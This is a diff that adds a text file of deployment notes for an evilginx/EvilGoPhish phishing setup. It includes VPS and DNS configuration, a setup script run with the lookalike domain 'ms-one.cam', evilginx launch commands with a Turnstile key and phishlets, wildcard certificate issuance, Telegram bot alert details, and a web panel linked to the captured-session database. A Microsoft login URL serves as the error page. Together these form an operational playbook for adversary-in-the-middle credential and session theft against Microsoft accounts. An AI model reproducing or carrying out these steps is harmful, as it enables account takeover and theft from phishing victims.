@@ -1,0 +1,181 @@
+////////////////////  SETTING UP FOR EVILGOPHISH  /////////////////////
+
+ssh root@yourIP
+
+git clone https://github.com/ObsidianCloak/Sponsors.git
+
+------ CONFIG TO SETUP VPS ENVIROMENT
+
+sudo apt update && sudo apt upgrade -y && sudo apt install network-manager -y && sudo systemctl stop systemd-resolved && sudo systemctl disable systemd-resolved && sudo bash -c 'echo -e "[main]\ndns=default" > /etc/NetworkManager/NetworkManager.conf' && sudo systemctl restart NetworkManager && sudo rm /etc/resolv.conf && echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf && echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf
+
+chmod u+x setup.sh && chmod u+x replace_rid.sh
+
+./setup.sh ms-one.cam "" true true user_id
+
+CD EVILGINX
+
+./evilginx2 -feed -g ../gophish/gophish.db -turnstile <PUBLIC_KEY>:<PRIVATE_KEY>
+
+
+
+CD Panel
+
+ chmod +x /root/myginx/panel/data/setup_permissions.sh
+
+ npm install --legacy-peer-deps
+
+npm run dev
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+#!/bin/bash
+
+# Update and upgrade system
+apt-get update
+apt-get upgrade -y
+
+# Install required packages
+wget https://go.dev/dl/go1.23.4.linux-amd64.tar.gz
+sudo rm -rf /usr/local/go
+sudo tar -C /usr/local -xzf go1.23.4.linux-amd64.tar.gz
+nano ~/.bashrc
+
+export PATH=$PATH:/usr/local/go/bin
+export GOPATH=$HOME/go
+export PATH=$PATH:$GOPATH/bin
+
+source ~/.bashrc
+
+go version
+
+apt-get install git make unzip certbot -y
+
+# Obtain Let's Encrypt SSL certificate
+certbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.example.com --email your@email.com
+
+# Build from source
+go build
+
+# Start the service
+./evilginx3 -p ./phishlets
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+TELEGRAM 
+
+botfather: @BotFather
+chatID: @GetMyChatID_Bot
+general chatID: @chatidfindbot
+
+///////////////////////////////////////////////////////////////////////
+
+Web-Panel
+
+sudo apt install -y nodejs npm
+
+chmod +x deploy.sh
+sudo ./deploy.sh
+
+
+
+npm install --legacy-peer-deps
+
+npm install --legacy-peer-deps
+
+npm run build && npm start
+
+
+
+chmod +x data/config_monitor.sh
+sudo ./data/config_monitor.sh setup
+
+npm install -g pm2
+
+npm run build
+
+pm2 start ecosystem.config.js
+
+pm2 save
+
+npm run build
+
+pm2 start ecosystem.config.js
+
+# View logs
+pm2 logs evilginx3-panel
+
+# Monitor the application
+pm2 monit
+
+# Restart the application
+pm2 restart evilginx3-panel
+
+# Stop the application
+pm2 stop evilginx3-panel
+
+# Delete the application from PM2
+pm2 delete evilginx3-panel
+
+\\\\\\\\\\\\\\\\\\
+
+cd web-panel
+
+sudo apt install -y nodejs npm
+
+npm install --legacy-peer-deps
+
+rm -rf node_modules
+rm package-lock.json
+npm cache clean --force
+
+# 3. Try installing again with legacy peer deps
+npm install --legacy-peer-deps
+
+npm install package.json
+
+chmod +x config_monitor.sh
+sudo ./config_monitor.sh setup
+
+rm -rf data/auth.db data/evilginx.db data/config.json data/ratelimit.db
+
+ln -s ../../../.evilginx/data.db data/evilginx.db
+
+sudo ufw allow 4001/tcp
+sudo ufw reload
+
+cd data && chmod +x config_monitor.sh && ./config_monitor.sh
+
+sudo apt install redis-server
+
+# Linux (systemd)
+sudo systemctl start redis
+
+screen -S webpanel
+
+node app.js
+
+Server will Run on port 4001
+    Browse it using your-server-ip:4001
+
+////////////////////////////////////////////////////////////////////////
+
+TMUX 
+
+tmux new -s session_name
+tmux attach -t session_name
+tmux kill-session -t session_name
+
+-------- SOME NORMAL EVILGINX CONFIG
+
+chmod +rwx evilginx
+./evilginx -p ../phishlets/
+./build/evilginx -p phishlets/ -developer
+
+-------- ERROR PAGE
+
+https://login.microsoftonline.com/common/saml2
+
+
+
